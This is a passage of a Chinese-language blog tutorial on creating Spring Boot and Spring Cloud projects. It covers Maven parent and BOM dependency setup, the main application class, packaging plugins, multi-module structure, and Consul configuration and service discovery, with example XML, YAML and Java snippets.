class="hljs-variable">&lt;/parent&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 补充：spring-boot-starter-parent<br><a href="https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-starter-parent">spring-boot-starter-parent</a> 是 Spring Boot 的官方父级项目，提供以下核心功能：</p><ol><li><font color="#00b0f0">依赖版本统一管理</font>：预定义常用依赖的兼容版本，避免版本冲突。</li><li><font color="#00b0f0">默认构建配置</font>：内置 Maven 插件（如 <code>spring-boot-maven-plugin</code>）的优化配置。</li><li><font color="#00b0f0">资源过滤</font>：自动处理 <code>application.properties</code> 和 <code>application.yml</code> 的占位符替换。</li></ol></blockquote><p>&#x3D;&#x3D;2.引入所需的起步依赖&#x3D;&#x3D;</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gherkin"><span class="hljs-comment"># 引入所需的起步依赖</span><br><span class="hljs-variable">&lt;dependency&gt;</span>  <br>    <span class="hljs-variable">&lt;groupId&gt;</span>org.springframework.boot<span class="hljs-variable">&lt;/groupId&gt;</span>  <br>    <span class="hljs-variable">&lt;artifactId&gt;</span>spring-boot-starter-web<span class="hljs-variable">&lt;/artifactId&gt;</span>  <br>    <span class="hljs-variable">&lt;version&gt;</span>XXXXXX<span class="hljs-variable">&lt;/version&gt;</span>  <br><span class="hljs-variable">&lt;/dependency&gt;</span>  <br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>继承父项目后，起步依赖无需指定版本号，而是由父级统一管理</li></ol></blockquote><hr><h5 id="4-2-3-手动添加-Spring-Boot-依赖-不继承-Parent"><a href="#4-2-3-手动添加-Spring-Boot-依赖-不继承-Parent" class="headerlink" title="4.2.3. 手动添加 Spring Boot 依赖 (不继承 Parent)"></a>4.2.3. 手动添加 Spring Boot 依赖 (不继承 Parent)</h5><p>&#x3D;&#x3D;1.引入 spring-boot-depencies&#x3D;&#x3D;</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-dependencies<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">type</span>&gt;</span>pom<span class="hljs-tag">&lt;/<span class="hljs-name">type</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>import<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 补充：spring-boot-depencies<br><a href="https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-dependencies">spring-boot-depencies</a> 是一个 Spring Boot 提供的父级 BOM（Bill of Materials）文件，主要用于统一管理 Spring Boot 项目的依赖版本。</p></blockquote><p>&#x3D;&#x3D;2.引入所需的起步依赖&#x3D;&#x3D;</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gherkin"><span class="hljs-comment"># 引入所需的起步依赖</span><br><span class="hljs-variable">&lt;dependency&gt;</span>  <br>    <span class="hljs-variable">&lt;groupId&gt;</span>org.springframework.boot<span class="hljs-variable">&lt;/groupId&gt;</span>  <br>    <span class="hljs-variable">&lt;artifactId&gt;</span>spring-boot-starter-web<span class="hljs-variable">&lt;/artifactId&gt;</span>  <br><span class="hljs-variable">&lt;/dependency&gt;</span>  <br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>起步依赖无需指定版本号，而是由 <code>spring-boot-depencies</code> 一管理</li><li>常用起步依赖有见 <code>Categories/Spring/Boot 常用起步依赖</code></li></ol></blockquote><hr><h4 id="4-3-创建主类并添加注解"><a href="#4-3-创建主类并添加注解" class="headerlink" title="4.3. 创建主类并添加注解"></a>4.3. 创建主类并添加注解</h4><p>在 <code>src/main/java/com/example</code> 下创建一个主类 <code>Application</code>，并添加 <code>@SpringBootApplication</code> 注解，它是 Spring Boot 应用的入口点</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">/**</span><br><span class="hljs-comment">* <span class="hljs-doctag">@SpringBootApplication</span> 是组合注解，包含</span><br><span class="hljs-comment">*    1. <span class="hljs-doctag">@SpringBootConfigutation</span>：标识为配置类</span><br><span class="hljs-comment">*    2. <span class="hljs-doctag">@EnableAutoConfiguration</span>：启用自动配置</span><br><span class="hljs-comment">*    3. <span class="hljs-doctag">@ComponentScan</span>：扫描当前包及子包的组件</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-meta">@SpringBootApplication</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Application</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"><span class="hljs-title class_">String</span>[] args</span>) &#123;<br>        <span class="hljs-title class_">SpringApplication</span>.<span class="hljs-title function_">run</span>(<span class="hljs-title class_">Application</span>.<span class="hljs-property">class</span>, args);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>主类的写法非常重要，需要牢牢记住</li></ol></blockquote><hr><h4 id="4-4-对项目进行必要配置"><a href="#4-4-对项目进行必要配置" class="headerlink" title="4.4. 对项目进行必要配置"></a>4.4. 对项目进行必要配置</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">spring:</span><br>  <span class="hljs-attr">application:</span><br>    <span class="hljs-attr">name:</span> <span class="hljs-string">xxxxxx</span>                    <span class="hljs-comment"># 项目名称，一般也作为 Consul 注册的名称</span><br><span class="hljs-attr">server:</span>  <br>  <span class="hljs-attr">port:</span> <span class="hljs-number">8080</span>                        <span class="hljs-comment"># 项目端口号</span><br>  <span class="hljs-attr">servlet:</span>  <br>    <span class="hljs-attr">encoding:</span>                       <span class="hljs-comment"># 项目编码</span><br>      <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span>  <br>      <span class="hljs-attr">charset:</span> <span class="hljs-string">UTF-8</span>  <br>      <span class="hljs-attr">force:</span> <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><hr><h4 id="4-5-检查打包插件"><a href="#4-5-检查打包插件" class="headerlink" title="4.5. 检查打包插件"></a>4.5. 检查打包插件</h4><p>如果我们使用 Dockerfile 的多阶段构建（multi-stage build）来打包 Spring Boot 项目，那么需要注意：</p><p>默认情况下，当执行 <code>mvn package</code> 命令时，Maven 只会将项目自身的 <code>.class</code> 文件和 <code>resources</code> 文件打包进生成的 JAR 文件，不会自动将外部依赖（如 Spring Boot 框架或第三方库）一同打包进去。</p><p>因此，打包出来的 JAR 文件并不能独立运行，除非目标环境已经具备所有所需依赖。这在容器环境中通常是不满足的。</p><p>为了生成可独立运行的可执行 JAR（fat jar 或 Uber JAR），我们需要在 <code>pom.xml</code> 中配置相关的打包插件：</p><ul><li><code>spring-boot-maven-plugin</code>（适用于 Spring Boot 项目，官方推荐）</li><li><code>maven-shade-plugin</code>（适用于通用 Java 项目）</li></ul><p>通常情况下，如果我们使用 Spring Initializr 等 Spring Boot 脚手架生成项目，它会自动为我们添加 <code>spring-boot-maven-plugin</code> 插件。但如果是手动创建项目，或者部分脚手架没有包含它，就需要我们手动添加。因此，建议检查一下项目中是否配置了打包插件，以确保能够正确构建可运行的 JAR 包：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span>  <br>        <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span>  <br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>  <br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <br>        <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span>  <br><span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="Web-项目"><a href="#Web-项目" class="headerlink" title="Web 项目"></a>Web 项目</h2><h3 id="普通-Web-项目"><a href="#普通-Web-项目" class="headerlink" title="普通 Web 项目"></a>普通 Web 项目</h3><ol><li>打开 IDEA 工具，安装 JavaToWeb 插件</li><li>创建空项目</li><li>配置 Maven、JDK</li><li>创建一个 Maven 模块</li><li>右键，点击 JBLJavaToWeb</li><li>Ctrl + F5 刷新一下</li><li>添加打包插件<ol><li>如果我们使用 Dockerfile 的多阶段构建（multi-stage build）来打包 Java Web 项目，那么需要注意：</li><li>默认情况下，当执行 <code>mvn package</code> 命令时，Maven 只会将项目自身的 <code>.class</code> 文件和 <code>resources</code> 文件打包进生成的 JAR 文件，不会自动将外部依赖（如 Spring Boot 框架或第三方库）一同打包进去。</li><li>因此，打包出来的 JAR 文件并不能独立运行，除非目标环境已经具备所有所需依赖。这在容器环境中通常是不满足的。</li><li>为了生成可独立运行的可执行 JAR（fat jar 或 Uber JAR），我们需要在 <code>pom.xml</code> 中配置相关的打包插件：<ul><li><code>spring-boot-maven-plugin</code>（适用于 Spring Boot 项目，官方推荐）</li><li><code>maven-shade-plugin</code>（适用于通用 Java 项目）</li></ul></li><li>所以我们需要手动添加<a href="https://mvnrepository.com/artifact/org.apache.maven.plugins/maven-shade-plugin">打包插件</a>：<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>maven-shade-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.4<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">executions</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">execution</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">phase</span>&gt;</span>package<span class="hljs-tag">&lt;/<span class="hljs-name">phase</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">goals</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">goal</span>&gt;</span>shade<span class="hljs-tag">&lt;/<span class="hljs-name">goal</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">goals</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">transformers</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">transformer</span> <span class="hljs-attr">implementation</span>=<span class="hljs-string">&quot;org.apache.maven.plugins.shade.resource.ManifestResourceTransformer&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">mainClass</span>&gt;</span>com.example.Main<span class="hljs-tag">&lt;/<span class="hljs-name">mainClass</span>&gt;</span><br>          <span class="hljs-tag">&lt;/<span class="hljs-name">transformer</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">transformers</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">execution</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">executions</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br></code></pre></td></tr></table></figure></li></ol></li></ol><h3 id="2-Web-应用开发"><a href="#2-Web-应用开发" class="headerlink" title="2. Web 应用开发"></a>2. Web 应用开发</h3><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AJava%20%E9%A1%B9%E7%9B%AE%E5%88%9B%E5%BB%BA%E5%92%8C%E7%BB%93%E6%9E%84/image-20250516194807264.png"></p><p>以追加 Spring Web 依赖的方式，勾选：</p><ol><li>&#x3D;&#x3D;Web&#x3D;&#x3D;<ol><li>Spring Reactive Web</li></ol></li></ol><h3 id="3-创建-Web-项目"><a href="#3-创建-Web-项目" class="headerlink" title="3. 创建 Web 项目"></a>3. 创建 Web 项目</h3><hr><h3 id="4-创建-Spring-Web-项目"><a href="#4-创建-Spring-Web-项目" class="headerlink" title="4. 创建 Spring Web 项目"></a>4. 创建 Spring Web 项目</h3><h4 id="4-1-创建-Spring-Web-项目"><a href="#4-1-创建-Spring-Web-项目" class="headerlink" title="4.1. 创建 Spring Web 项目"></a>4.1. 创建 Spring Web 项目</h4><hr><h3 id="5-创建-Spring-Cloud-项目"><a href="#5-创建-Spring-Cloud-项目" class="headerlink" title="5. 创建 Spring Cloud 项目"></a>5. 创建 Spring Cloud 项目</h3><p>这里采用 IDEA 提供的脚手架创建 Spring Boot 项目，分别勾选：</p><ol><li>&#x3D;&#x3D;Web&#x3D;&#x3D;<ol><li>Spring Web</li></ol></li><li>&#x3D;&#x3D;Spring Cloud Config&#x3D;&#x3D;：<ol><li>Consul Configuration</li></ol></li><li>&#x3D;&#x3D;Spring Cloud Discovery&#x3D;&#x3D;<ol><li>Consul Discovery</li></ol></li><li>&#x3D;&#x3D;Spring Cloud Routing&#x3D;&#x3D;：<ol><li>Openfeign</li><li>Gateway</li></ol></li></ol><hr><h3 id="6-补充：如何追加依赖"><a href="#6-补充：如何追加依赖" class="headerlink" title="6. 补充：如何追加依赖"></a>6. 补充：如何追加依赖</h3><p>&#x3D;&#x3D;1.安装 editstarters 插件&#x3D;&#x3D;<br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AJava%20%E9%A1%B9%E7%9B%AE%E5%88%9B%E5%BB%BA%E5%92%8C%E7%BB%93%E6%9E%84/image-20250503170333048.png"></p><p>&#x3D;&#x3D;2.进行追加依赖&#x3D;&#x3D;</p><ol><li>找到 Pom.xml</li><li>右键，选择 <code>Generate</code></li><li>选择 <code>Edit Starters</code></li><li>URL 保持默认的 <code>https://start.spring.io/</code>，选择 OK</li><li>刷新 Maven</li></ol><hr><h3 id="7-补充：手动导入项目"><a href="#7-补充：手动导入项目" class="headerlink" title="7. 补充：手动导入项目"></a>7. 补充：手动导入项目</h3><p>问题核心是：Maven 依赖没导进来，我们手动导一下即可<br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AJava%20%E9%A1%B9%E7%9B%AE%E5%88%9B%E5%BB%BA%E5%92%8C%E7%BB%93%E6%9E%84/image-20250413192204786.png"></p><hr><h1 id="完善-Spring-Cloud-项目结构以实现成熟架构"><a href="#完善-Spring-Cloud-项目结构以实现成熟架构" class="headerlink" title="完善 Spring Cloud 项目结构以实现成熟架构"></a>完善 Spring Cloud 项目结构以实现成熟架构</h1><p><strong>引言</strong></p><p>现代应用程序日益增长的复杂性要求采用模块化和组织良好的架构。Spring Cloud 提供了一套全面的工具，用于构建分布式系统，而一个成熟的项目结构对于确保应用程序的可维护性、可伸缩性和长期成功至关重要。组织良好的多模块架构具有诸多优势，包括改进的可维护性，允许团队独立处理不同的功能模块；增强的可伸缩性，可以根据需要单独扩展特定模块；提高代码可重用性，通用组件可以在不同的模块之间共享；以及促进更好的团队协作，每个团队可以专注于特定的模块 1。本报告旨在提供一个全面的指南，用于将所提供的基本 Spring Cloud 项目结构增强为一个更成熟和健壮的设计，其中融入了行业最佳实践。</p><p><strong>分析现有结构</strong></p><p>所提供的项目结构以根包 <code>com.example</code> 为基础，组织成三个功能模块 <code>module1</code>、<code>module2</code> 和 <code>module3</code>，以及一个用于通用配置和工具的 <code>application</code> 模块。每个功能模块都包含一个标准的 Spring Boot 应用程序结构，包括启动类 (<code>Application.java</code>)、控制器层 (<code>controller</code>)、业务层 (<code>service</code>，进一步划分为接口 <code>inter</code> 和实现 <code>impl</code>)、持久层 (<code>repository</code>) 和模型层 (<code>model</code>，细分为实体 <code>entity</code>、数据传输对象 <code>dto</code> 和视图对象 <code>vo</code>)。<code>application</code> 模块则包含用于配置的 <code>config</code> 包和用于通用工具类的 <code>util</code> 包。</p><p>现有结构展现了初步的模块化组织和基本的层次分离，这有助于代码的组织和理解 5。每个模块的独立性允许在一定程度上实现关注点分离。通用配置和工具类的集中化管理也是一个积极的方面。然而，根据成熟的 Spring Cloud 架构原则和研究资料，该结构仍有改进的空间。首先，模块的划分似乎是基于技术上的分离（例如，不同的功能模块），而不是基于明确的业务领域或特定的功能。其次，该结构缺乏关于模块之间依赖关系管理的具体说明。第三，没有明确提及集中式配置或服务发现机制，这对于构建可伸缩和弹性的分布式系统至关重要。此外，<code>application</code> 模块的范围可能需要扩展，以包含诸如日志记录、异常处理和安全性配置等关键方面。最后，该结构没有提供关于构建配置、测试策略或文档实践的信息。</p><p><strong>多模块组织的最佳实践</strong></p><p>在构建一个成熟的 Spring Cloud 项目时，选择合适的多模块组织策略至关重要。主要有两种常见的方法：基于领域驱动设计 (DDD) 和基于技术分层 3。</p><p>领域驱动设计强调根据业务能力或领域来组织模块。例如，在一个电子商务应用中，可能会有 <code>customer</code>、<code>order</code> 和 <code>product</code> 等模块 4。这种方法的优势在于它将软件结构与业务紧密结合，改善了技术和业务人员之间的沟通，并促进了业务特性的独立开发和部署 4。相反，基于技术分层的组织方式则根据技术职责来划分模块，例如 <code>api</code>、<code>service</code> 和 <code>data-access</code> 9。这种方法的好处是关注点分离清晰，易于维护各个技术层。然而，纯粹的技术分离可能导致开发人员需要跨多个模块处理单个功能，从而降低效率 4。对于复杂的业务应用程序，领域驱动设计通常能带来更好的可维护性和可伸缩性。对于较简单的应用程序或围绕技术专长组建的团队，技术分层可能就足够了。项目应该根据其具体需求和团队结构来选择最合适的策略。</p><p>识别逻辑模块需要仔细考虑应用程序的业务功能和技术需求。模块可以基于业务能力（如用户管理、订单处理、报告）或技术关注点（如核心库、基础设施服务）来划分。关键在于确保每个模块都有清晰的边界和明确的职责 4。此外，还应考虑模块的独立部署和可伸缩性 8。对于较小的项目，可以先从单一项目开始，并按功能进行包组织，随着应用程序的增长，再逐步重构为多模块结构 14。</p><p>在多模块项目中，依赖管理至关重要。父 POM（在 Maven 中）或根 <code>build.gradle</code>（在 Gradle 中）用于管理子模块的依赖关系 1。Maven 的 <code>pom.xml</code> 文件中的 <code>&lt;modules&gt;</code> 标签和 Gradle 的 <code>settings.gradle</code> 文件中的 <code>include</code> 语句用于定义子模块 2。为了提高模块的独立性并降低耦合，应该尽量减少模块之间的依赖关系 4。Gradle 提供了 <code>api</code> 和 <code>implementation</code> 依赖项的概念，用于控制模块之间依赖项的可见性 4。推荐使用物料清单 (BOM) 来一致地管理所有模块中第三方依赖项的版本 18。父模块应该指定子模块，并可能在 Maven 的 <code>dependencyManagement</code> 部分管理公共依赖项 2。每个模块都应该包含其自身功能所需的所有构件，包括其自身的依赖项，以最大限度地减少对其他模块的依赖 4。</p><p><strong>增强模块结构</strong></p><p>在每个模块内部，采用标准的包结构有助于代码的组织和可维护性。常见的做法是将关注点分离到不同的包中，例如 <code>controller</code>、<code>service</code>（进一步细分为 <code>inter</code> 和 <code>impl</code> 子包）、<code>repository</code>、<code>model</code>（细分为 <code>entity</code>、<code>dto</code> 和 <code>vo</code>）、<code>config</code>、<code>util</code>、<code>exception</code>，以及可选的 <code>security</code> 和 <code>validation</code> 包 3。<code>controller</code> 包负责处理传入的 HTTP 请求并返回响应；<code>service</code> 包包含业务逻辑，通常接口定义在 <code>inter</code> 子包中，而具体实现在 <code>impl</code> 子包中；<code>repository</code> 包管理数据访问和持久化；<code>model</code> 包定义数据结构，包括 JPA 实体、用于数据交换的数据传输对象 (DTO) 和用于表示数据的视图对象 (VO)；<code>config</code> 包存放应用程序特定的配置类；<code>util</code> 包包含可重用的工具类；<code>exception</code> 包定义自定义异常类以实现更好的错误处理；<code>security</code> 包管理身份验证和授权逻辑；<code>validation</code> 包实现数据验证规则。按照功能组织包（例如，<code>controller</code>、<code>service</code>、<code>repository</code>、<code>model</code>）是一种常见且推荐的做法，可以更好地导航和组织模块内的代码 5。然而，有些团队更喜欢按特性组织，将特定特性的所有相关类（控制器、服务、存储库）分组到专用包中 3。</p><p>坚持关注点分离原则至关重要，确保每个组件（类、包、模块）都有特定的职责，避免混合不同的关注点 19。这有助于提高可维护性、可测试性并降低引入错误的风险。控制器应主要处理 HTTP 请求，服务应包含业务逻辑，而存储库应管理数据持久性 6。</p><p>模型层需要进一步细化 <code>entity</code>、<code>dto</code> 和 <code>vo</code> 类的用途和用法 5。<code>entity</code> 通常表示持久化数据模型，通常映射到数据库表。<code>dto</code> 是用于在层或服务之间交换数据的数据传输对象，通常针对特定用例定制，并且可能与实体不同。<code>vo</code> 是表示不可变数据结构或用于向 UI 展示数据的视图对象。使用 DTO 有助于将 API 与内部数据模型（实体）解耦，从而允许两者独立更改而不会直接影响彼此 9。<code>entity</code> 和 <code>model</code> 作为包名称的选择可能取决于模型对象是否严格绑定到 ORM 或代表更广泛的领域模型 21。</p><p><strong>使用 Spring Cloud Consul 实现集中式配置</strong></p><p>Spring Cloud Consul Config 提供了一种强大的机制来管理分布式应用程序的集中式配置 22。它利用 Consul 的 Key&#x2F;Value 存储作为配置数据的存储中心 22。使用 Consul 进行集中式配置管理具有诸多优势，例如动态配置更新、版本控制以及跨多个服务的一致配置源。</p><p>要配置 Spring Cloud Consul Config，通常需要在 <code>bootstrap.yml</code> 文件（在 <code>application.yml</code> 之前加载）中进行配置，尤其是在使用较旧的 Spring Cloud 版本时。对于 Spring Boot 2.4+，推荐使用 <code>spring.config.import</code> 属性在 <code>application.yml</code> 中启用 Consul 配置 22。以下是一些基本的配置示例：</p><p>YAML</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">spring</span>:<br>  <span class="hljs-attribute">cloud</span>:<br>    <span class="hljs-attribute">consul</span>:<br>      <span class="hljs-attribute">host</span>: localhost # Consul 代理的主机名或 IP 地址<span class="hljs-meta"> [22, 23, 28, 29, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42]</span><br>      <span class="hljs-attribute">port</span>: <span class="hljs-number">8500</span>    # Consul 代理的端口号（默认为 <span class="hljs-number">8500</span>）[<span class="hljs-number">22</span>, <span class="hljs-number">23</span>, <span class="hljs-number">28</span>, <span class="hljs-number">29</span>, <span class="hljs-number">31</span>, <span class="hljs-number">32</span>, <span class="hljs-number">33</span>, <span class="hljs-number">34</span>, <span class="hljs-number">35</span>, <span class="hljs-number">36</span>, <span class="hljs-number">37</span>, <span class="hljs-number">38</span>, <span class="hljs-number">39</span>, <span class="hljs-number">40</span>, <span class="hljs-number">41</span>, <span class="hljs-number">42</span>]<br>      <span class="hljs-attribute">config</span>:<br>        <span class="hljs-attribute">enabled</span>: true # 启用 Consul 配置<span class="hljs-meta"> [22, 23, 30, 33, 34, 35, 36, 40, 41]</span><br>        <span class="hljs-attribute">format</span>: YAML    # Consul 中配置数据的格式（可以是 YAML 或 PROPERTIES）[<span class="hljs-number">23</span>, <span class="hljs-number">28</span>, <span class="hljs-number">29</span>, <span class="hljs-number">32</span>, <span class="hljs-number">34</span>, <span class="hljs-number">35</span>, <span class="hljs-number">36</span>]<br>        <span class="hljs-attribute">data</span>-key: data  # 保存 YAML/Properties 数据的 Key<span class="hljs-meta"> [23, 28, 29, 32, 35, 36]</span><br>        <span class="hljs-attribute">fail</span>-fast: false # 在开发环境中，如果 Consul 不可用，则不停止应用程序启动<span class="hljs-meta"> [23, 32, 40, 43]</span><br></code></pre></td></tr></table></figure><p>或者，对于 Spring Boot 2.4+：</p><p>YAML</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">spring:</span><br><span class="hljs-symbol">  config:</span><br><span class="hljs-symbol">    import:</span> consul:<br></code></pre></td></tr></table></figure><p>Consul 服务器的详细信息和应用程序名称通常在 <code>bootstrap.yml</code> 中配置，因为该文件在应用程序生命周期的早期加载 22。<code>spring.cloud.bootstrap.enabled</code> 属性会影响 Consul 配置是否应放置在 <code>bootstrap.yml</code> 或 <code>application.yml</code> 中，尤其是在较旧的 Spring Cloud 版本中 23。</p><p>在 Consul 中，建议将配置键组织在一个公共前缀下（例如 <code>/config</code>），后跟应用程序名称和可选的配置文件（例如 <code>/config/my-app</code>、<code>/config/my-app,dev</code>）22。Consul Config 从多个上下文中加载属性，更具体的上下文（例如，带有配置文件的应用程序）优先于不太具体的上下文（例如，默认的 <code>application</code> 上下文）23。为了更好地组织，建议将配置属性以 YAML 或 Properties 格式存储在单个键（例如 <code>data</code>）中 23。</p><p>要启用来自 Consul 的配置更改的动态更新，可以使用 <code>@RefreshScope</code> 注解标记使用配置属性的 Spring Bean 22。此外，还可以使用 <code>/refresh</code> actuator 端点手动触发配置重新加载 23。Spring Cloud Consul 还提供了 Config Watch 功能，用于自动检测和重新加载配置更改 23。</p><p><strong>使用 Spring Cloud Consul 集成服务发现</strong></p><p>服务发现是微服务或分布式环境中的关键概念，它允许服务在没有硬编码网络位置的情况下相互查找和通信 22。Spring Cloud Consul Discovery 利用 Consul 作为服务注册表和发现提供者 22。Spring Cloud Consul 利用 Consul HTTP API 进行服务注册和发现 37。</p><p>要集成服务发现，首先需要将 <code>spring-cloud-starter-consul-discovery</code> 依赖项添加到项目中 37。然后，在 <code>bootstrap.yml</code> 或 <code>application.yml</code> 中进行以下配置：</p><p>YAML</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">spring:</span><br>  <span class="hljs-params">application:</span><br>    <span class="hljs-params">name:</span> your-service-name <span class="hljs-comment"># 您的服务名称 [22, 29, 31, 32, 33, 35, 37, 38, 41, 42]</span><br>  <span class="hljs-params">cloud:</span><br>    <span class="hljs-params">consul:</span><br>      <span class="hljs-params">host:</span> localhost<br>      <span class="hljs-params">port:</span> <span class="hljs-number">8500</span><br>      <span class="hljs-params">discovery:</span><br>        <span class="hljs-params">enabled:</span> <span class="hljs-literal">true</span> <span class="hljs-comment"># 启用服务发现 [29, 37, 38, 44]</span><br>        <span class="hljs-params">prefer-ip-address:</span> <span class="hljs-literal">true</span> <span class="hljs-comment"># 注册服务的 IP 地址 [32, 33, 38]</span><br>        <span class="hljs-params">instance-id:</span> $&#123;spring.application.name&#125;:$&#123;random.value&#125; <span class="hljs-comment"># 可选：设置唯一的实例 ID [22, 29, 31, 32, 35, 37, 38, 41]</span><br>        <span class="hljs-params">healthCheckPath:</span> $&#123;management.server.servlet.context-path&#125;<span 